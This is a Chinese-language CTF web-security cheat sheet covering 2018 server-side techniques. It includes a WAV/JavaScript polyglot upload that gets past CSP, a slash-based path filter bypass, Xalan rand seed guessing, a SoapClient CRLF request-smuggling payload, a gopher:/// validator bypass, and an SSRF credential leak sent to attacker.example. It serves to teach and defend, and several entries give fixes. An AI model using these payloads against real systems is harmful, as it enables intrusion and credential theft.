# CTF Web - 进阶服务端技巧（第三部分）

CVE 时代与 2018 年代的进阶服务端技巧（CSAW、35C3、ASIS、PlaidCTF）。第一、二部分见 [server-side-advanced.md](server-side-advanced.md) 与 [server-side-advanced-2.md](server-side-advanced-2.md)。

## 目录
- [经 .wave 扩展名的 WAV 多语言上传绕过（PlaidCTF 2018）](#经-wave-扩展名的-wav-多语言上传绕过plaidctf-2018)
- [多斜杠 URL 解析器 `path.startswith` 绕过（CSAW 2018 Finals）](#多斜杠-url-解析器-pathstartswith-绕过csaw-2018-finals)
- [Xalan XSLT math:random() 种子猜测（35C3 2018）](#xalan-xslt-mathrandom-种子猜测35c3-2018)
- [SoapClient _user_agent CRLF 方法走私（35C3 2018）](#soapclient-_user_agent-crlf-方法走私35c3-2018)
- [`gopher://` 无主机 URL scheme 绕过（35C3 2018）](#gopher-无主机-url-scheme-绕过35c3-2018)
- [经攻击者指定外连 URL 的 SSRF 凭据泄露（ASIS Finals 2018）](#经攻击者指定外连-url-的-ssrf-凭据泄露asis-finals-2018)

---

---

<a id="wav-polyglot-upload-bypass-via-wave-extension-plaidctf-2018"></a>
## 经 .wave 扩展名的 WAV 多语言上传绕过（PlaidCTF 2018）

**模式（idIoT: Action）：** 站点接受 `ogg/wav/wave/webm/mp3` 上传，并通过解析 RIFF/WAVE 头来校验。CSP 为 `script-src 'self'`，内联 XSS 无效，但同源 `<script src=...>` 指向上传文件就能执行。浏览器拒绝加载 Content-Type 以 `audio/` 开头的响应，然而许多发行版的 Apache 对 `.wave` 扩展名没有 MIME 映射，会按默认类型（通常是 `application/octet-stream` 或干脆不带 `Content-Type`）返回。

**构造利用文件：**
1. 造一个文件：开头字节能解析为合法 RIFF/WAVE 容器，但 `data` 块的内容打开一个 JavaScript 块注释并嵌入 payload。
2. 保存为 `.wave`（而不是 `.wav`），让 Apache 不把它标为音频。
3. 通过既有的 XSS 汇点注入 `<script src="/uploads/evil.wave"></script>` —— 浏览器会从同源 URL 执行脚本，满足 `script-src 'self'`。

```text
RIFF=1/*WAVEfmt ..........]................LIST....INFO
ISFT....Lavf57.83.100.data........................
........*/ ; alert(1);
```
十六进制视图（截断）：前 4 字节 `52 49 46 46` 仍是 `RIFF`；古怪的长度字段 `3d 31 2f 2a`（`=1/*`）对 WAV 解析器合法，同时打开一个 JS 注释，一直延续到 `data` 块末尾的 `*/ ;alert(1);`。

**关键点：** 只检查魔数或基于扩展名判断 MIME 的上传过滤器，会被 Web 服务器没有显式映射的扩展名击穿。把每个允许的扩展名都拿去对服务端的 MIME 数据库（`mime.types`）测一遍 —— 哪个落到 `application/octet-stream`，哪个就能在 `script-src 'self'` 下充当脚本 gadget。修复：为用户上传强制严格的响应 `Content-Type`（如 `application/octet-stream` + `Content-Disposition: attachment`）。

**参考：** PlaidCTF 2018 — writeup 10018

---

<a id="multi-slash-url-parser-pathstartswith-bypass-csaw-2018-finals"></a>
## 多斜杠 URL 解析器 `path.startswith` 绕过（CSAW 2018 Finals）

**模式：** 服务端代码拒绝解析后路径以 `/flaginfo` 开头的 URL，但大多数 HTTP 栈会把连续斜杠等价解析。多加一个斜杠，解析出的路径就变成 `//flaginfo`，破坏 `startswith("/flaginfo")` 的同时仍能路由到真实端点。

```text
# Filtered
http://127.0.0.1:5000/flaginfo
# Allowed
http://127.0.0.1:5000///flaginfo
```

**关键点：** 过滤器检查的解析结果与最终路由请求的解析器并不一致。当过滤是字符串比较而非结构化匹配时，务必测试 `///`、`/./`、`%2f` 和 `http:/127.0.0.1` 等变体。

**参考：** CSAW 2018 Finals — NekoCat，writeups 12130、12144

---

<a id="xalan-xslt-mathrandom-seed-guess-35c3-2018"></a>
## Xalan XSLT math:random() 种子猜测（35C3 2018）

**模式：** Xalan 的 `math:random()` 扩展使用 C 的 `srand(time(NULL))`。题目泄露了 5 个连续随机值；用 libc `rand()` 爆破 3 个连续种子（`t-1`、`t`、`t+1`），找出与泄露值匹配的那个，即可预测下一个值。

```c
for (long base = time(NULL) - 1; base <= time(NULL) + 1; base++) {
    srand(base);
    for (int j = 0; j < 5; j++) {
        long long v = llround((double)rand() / RAND_MAX * 4294967296.0);
        /* compare with leaked values */
    }
}
```

**关键点：** 任何暴露数学扩展的 XSLT 引擎通常都直接代理到 libc 的 rand/srand；种子是秒级时间值，3 个候选值就能爆破完。

**参考：** 35C3 CTF 2018 — Juggle，writeup 12803

---

<a id="soapclient-_user_agent-crlf-method-smuggling-35c3-2018"></a>
## SoapClient _user_agent CRLF 方法走私（35C3 2018）

**模式：** PHP 的 `SoapClient` 允许用户代码设置 `_user_agent` 属性。该字符串未经 CRLF 过滤就被插进 HTTP 请求，因此注入 `\r\n\r\n` 后接一段完整 HTTP 请求，就能从同一 TCP 连接里夹带出*第二个*请求 —— 把仅支持 POST 的原语变成打向 localhost 受限管理端点的 GET（或任意其他方法）。

```php
$c = new SoapClient(null, [
    'location'   => 'http://target/soap',
    'uri'        => 'x',
    'user_agent' => "x\r\nX-Forwarded-For: 127.0.0.1\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
]);
$c->__soapCall('x', []);
```

**关键点：** 任何允许在反序列化对象上设置"魔法"HTTP 头字符串的序列化 gadget，都能变成 HTTP 走私器。PHP 常见的两个 gadget 是 `SoapClient->_user_agent` 和 `SoapClient->_cookies`。

**参考：** 35C3 CTF 2018 — post，writeup 12808

---

<a id="gopher-no-host-url-scheme-bypass-35c3-2018"></a>
## `gopher://` 无主机 URL scheme 绕过（35C3 2018）

**模式：** 白名单校验器只在 URL 带主机时才执行 scheme 检查（`parsed.scheme in ('http','https') if parsed.host`）。`gopher:///host:port/data` 在某些解析器里主机为空，从而完全跳过检查，请求后端就能用 gopher 与任意 TCP 服务对话 —— MSSQL、Redis、SMTP。

```text
gopher:///127.0.0.1:1433/_<raw TDS bytes>
```

**关键点：** 每个 URL scheme 都要在带 `//host` 和不带主机两种形态下对校验器各测一遍，因为解析器与校验器的差异是不对称的。`gopher:///x`、`file:///x`、`jar:file:///x` 是常见的 scheme 绕过。

**参考：** 35C3 CTF 2018 — post，writeup 12808

---

<a id="ssrf-credential-leak-via-attacker-specified-outbound-url-asis-finals-2018"></a>
## 经攻击者指定外连 URL 的 SSRF 凭据泄露（ASIS Finals 2018）

**模式：** 服务从用户可控 URL 拉取资源，并给自己的请求附带 HTTP Basic 凭据。把 URL 指向攻击者控制的主机，收到的请求里就带着 `Authorization: Basic <base64(user:pass)>`。

```http
# Listener (attacker side)
nc -lvnp 80

# Victim sends:
GET / HTTP/1.1
Host: attacker.example
Authorization: Basic YmlnYnJvdGhlcjo0UWozcmM0WmhOUUt2N1J6
```

**关键点：** 只要客户端库使用按请求凭据（`requests.auth`、`urllib3 auth_header`、Python `http.client` 默认凭据），而攻击者能决定目标 URL，SSRF 就会泄露凭据。重定向时要剥掉 `Authorization`，且默认绝不附带凭据。

**参考：** ASIS CTF Finals 2018 — Gunshop 2，writeup 12420
